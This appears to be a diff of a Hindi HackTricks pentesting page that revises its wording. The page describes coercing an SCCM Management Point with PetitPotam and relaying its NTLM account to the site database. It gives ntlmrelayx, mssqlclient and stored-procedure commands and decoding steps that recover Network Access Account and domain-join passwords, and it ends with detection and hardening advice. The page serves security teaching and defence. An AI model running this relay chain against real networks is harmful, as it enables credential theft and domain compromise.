@@ -3,25 +3,25 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-एक **System Center Configuration Manager (SCCM) Management Point (MP)** को SMB/RPC पर authenticate करने के लिए बाध्य करके और उस NTLM machine account को **site database (MSSQL)** पर **relaying** करने से आपको `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights मिलते हैं। ये roles आपको stored procedures के एक सेट को call करने देते हैं, जो **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables आदि) expose करते हैं। ये blobs hex-encoded/encrypted होते हैं, लेकिन **PXEthief** से इन्हें decode और decrypt किया जा सकता है, जिससे plaintext secrets प्राप्त होते हैं।
+**System Center Configuration Manager (SCCM) Management Point (MP)** को SMB/RPC पर authenticate करने के लिए बाध्य करके और उस NTLM machine account को **site database (MSSQL)** पर **relaying** करने से आपको `smsdbrole_MP` / `smsdbrole_MPUserSvc` rights मिलते हैं। ये roles आपको stored procedures के एक समूह को call करने देते हैं, जो **Operating System Deployment (OSD)** policy blobs (Network Access Account credentials, Task-Sequence variables आदि) expose करते हैं। ये blobs hex-encoded/encrypted होते हैं, लेकिन **PXEthief** से decode और decrypt किए जा सकते हैं, जिससे plaintext secrets प्राप्त होते हैं।<sup>[[2]](#references)</sup>
 
 High-level chain:
-1. MP और site DB खोजें ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`।
+1. MP और site DB discover करें ↦ unauthenticated HTTP endpoint `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`।
 2. `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks` शुरू करें।
 3. **PetitPotam**, PrinterBug, DFSCoerce आदि का उपयोग करके MP को coerce करें।
-4. SOCKS proxy के माध्यम से relayed **<DOMAIN>\\<MP-host>$** account के रूप में `mssqlclient.py -windows-auth` से connect करें।
+4. SOCKS proxy के माध्यम से `mssqlclient.py -windows-auth` से relayed **<DOMAIN>\\<MP-host>$** account के रूप में connect करें।
 5. Execute करें:
 * `use CM_<SiteCode>`
 * `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
 * `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (या `MP_GetPolicyBodyAfterAuthorization`)
 6. `0xFFFE` BOM हटाएँ, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`।
 
-`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` आदि secrets, PXE या clients को access किए बिना recover किए जाते हैं।<sup>[[1]](#references)[[3]](#references)</sup>
+`OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` आदि secrets, PXE या clients को touch किए बिना recover किए जा सकते हैं।<sup>[[1]](#references)[[3]](#references)</sup>
 
 ---
 
-## 1. Unauthenticated MP endpoints की Enumeration
-MP ISAPI extension **GetAuth.dll** कई ऐसे parameters expose करता है जिनके लिए authentication आवश्यक नहीं होती (जब तक site केवल PKI का उपयोग न करती हो):<sup>[[1]](#references)</sup>
+## 1. Unauthenticated MP endpoints की enumeration
+MP ISAPI extension **GetAuth.dll** कई ऐसे parameters expose करता है जिनके लिए authentication आवश्यक नहीं है (जब तक site PKI-only न हो):<sup>[[1]](#references)</sup>
 
 | Parameter | Purpose |
 |-----------|---------|
@@ -44,7 +44,7 @@ ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support
 python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
 -u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
 ```
-जब coercion fire होता है, तो आपको कुछ ऐसा दिखाई देना चाहिए:
+जब coercion trigger होता है, तो आपको कुछ ऐसा दिखाई देना चाहिए:
 ```
 [*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
 [*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
@@ -69,23 +69,23 @@ WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
 ```sql
 EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
 ```
-प्रत्येक row में `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` शामिल होते हैं।
+प्रत्येक row में `PolicyAssignmentID`,`Body` (hex), `PolicyID`, `PolicyVersion` होते हैं।
 
 इन policies पर ध्यान दें:
-* **NAAConfig** – Network Access Account credentials
+* **NAAConfig**  – Network Access Account creds
 * **TS_Sequence** – Task Sequence variables (OSDJoinAccount/Password)
 * **CollectionSettings** – इसमें run-as accounts हो सकते हैं
 
-### 3.3 पूर्ण body प्राप्त करें
-यदि आपके पास पहले से `PolicyID` और `PolicyVersion` हैं, तो आप इसका उपयोग करके clientID की आवश्यकता को छोड़ सकते हैं:
+### 3.3  पूर्ण body प्राप्त करें
+यदि आपके पास पहले से `PolicyID` और `PolicyVersion` हैं, तो आप इसका उपयोग करके clientID requirement को छोड़ सकते हैं:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> महत्वपूर्ण: SSMS में “Maximum Characters Retrieved” को बढ़ाएँ (>65535), अन्यथा blob truncate हो जाएगा।
+> IMPORTANT: SSMS में “Maximum Characters Retrieved” को (>65535) बढ़ाएँ, अन्यथा blob truncate हो जाएगा।
 
 ---
 
-## 4. Decode & decrypt the blob
+## 4. blob को Decode और decrypt करें
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -103,17 +103,17 @@ NetworkAccessPassword: P4ssw0rd123
 ---
 
 ## 5. Relevant SQL roles & procedures
-Relay के बाद login को निम्न roles में map किया जाता है:<sup>[[1]](#references)</sup>
+relay के बाद login को निम्न पर map किया जाता है:<sup>[[1]](#references)</sup>
 * `smsdbrole_MP`
 * `smsdbrole_MPUserSvc`
 
-ये roles दर्जनों EXEC permissions प्रदान करते हैं, इस attack में उपयोग किए जाने वाले मुख्य permissions हैं:
+ये roles दर्जनों EXEC permissions expose करते हैं; इस attack में उपयोग किए जाने वाले मुख्य permissions ये हैं:
 
 | Stored Procedure | Purpose |
 |------------------|---------|
-| `MP_GetMachinePolicyAssignments` | किसी `clientID` पर लागू policies की सूची बनाता है। |
-| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूरी policy body लौटाता है। |
-| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path द्वारा लौटाया जाता है। |
+| `MP_GetMachinePolicyAssignments` | किसी `clientID` पर लागू policies की सूची। |
+| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | पूरी policy body return करता है। |
+| `MP_GetListOfMPsInSiteOSD` | `MPKEYINFORMATIONMEDIA` path द्वारा return किया जाता है। |
 
 आप पूरी सूची इस प्रकार inspect कर सकते हैं:
 ```sql
@@ -131,23 +131,23 @@ AND  pe.permission_name='EXECUTE';
 * **TFTP के माध्यम से boot artifacts प्राप्त करें**: प्राप्त paths का उपयोग करके `variables.dat` को TFTP से download करें (unauthenticated)। यह file छोटी (कुछ KB) होती है और इसमें encrypted media variables होती हैं।
 * **Decrypt या crack करें**:
 - यदि response में decryption key शामिल है, तो `variables.dat` को सीधे decrypt करने के लिए उसे **SharpPXE** में feed करें।
-- यदि key प्रदान नहीं की गई है (PXE media custom password से protected है), तो SharpPXE offline cracking के लिए **Hashcat-compatible** `$sccm$aes128$...` hash generate करता है। Password recover करने के बाद file को decrypt करें।
-* **Decrypted XML को parse करें**: plaintext variables में SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs और अन्य identifiers) होते हैं। SharpPXE इन्हें parse करता है और follow-on abuse के लिए GUID/PFX/site parameters से prefilled, ready-to-run **SharpSCCM** command print करता है।
+- यदि key उपलब्ध नहीं है (PXE media custom password से protected है), तो SharpPXE offline cracking के लिए **Hashcat-compatible** `$sccm$aes128$...` hash जारी करता है। Password recover करने के बाद file को decrypt करें।
+* **Decrypted XML को parse करें**: plaintext variables में SCCM deployment metadata (**Management Point URL**, **Site Code**, media GUIDs और अन्य identifiers) होते हैं। SharpPXE उन्हें parse करता है और follow-on abuse के लिए GUID/PFX/site parameters से prefilled, ready-to-run **SharpSCCM** command print करता है।
 * **Requirements**: केवल PXE listener (UDP/4011) और TFTP तक network reachability आवश्यक है; local admin privileges की जरूरत नहीं है।
 
 ---
 
 ## 7. Detection & Hardening
-1. **MP logins को monitor करें** – किसी ऐसे IP से MP computer account का login करना जो उसके host का IP नहीं है, लगभग निश्चित रूप से relay है।<sup>[[1]](#references)</sup>
-2. Site database (`PREVENT-14`) पर **Extended Protection for Authentication (EPA)** enable करें।
-3. Unused NTLM को disable करें, SMB signing enforce करें, RPC को restrict करें (\
+1. **MP logins monitor करें** – किसी MP computer account का ऐसे IP से login करना जो उसके host का IP नहीं है, लगभग relay को दर्शाता है।<sup>[[1]](#references)</sup>
+2. Site database पर **Extended Protection for Authentication (EPA)** enable करें (`PREVENT-14`)।
+3. Unused NTLM disable करें, SMB signing enforce करें, RPC restrict करें (
 `PetitPotam`/`PrinterBug` के विरुद्ध उपयोग किए जाने वाले समान mitigations)।
 4. IPSec / mutual-TLS के साथ MP ↔ DB communication को harden करें।
-5. **PXE exposure को constrain करें** – UDP/4011 और TFTP को trusted VLANs तक firewall करें, PXE passwords required करें और `SMSBoot\\*\\pxe\\variables.dat` के TFTP downloads पर alert करें।<sup>[[4]](#references)</sup>
+5. **PXE exposure को constrain करें** – UDP/4011 और TFTP को trusted VLANs तक firewall से सीमित करें, PXE passwords required करें और `SMSBoot\\*\\pxe\\variables.dat` के TFTP downloads पर alert करें।<sup>[[4]](#references)</sup>
 
 ---
 
-## See also
+## यह भी देखें
 * NTLM relay fundamentals:
 
 {{#ref}}
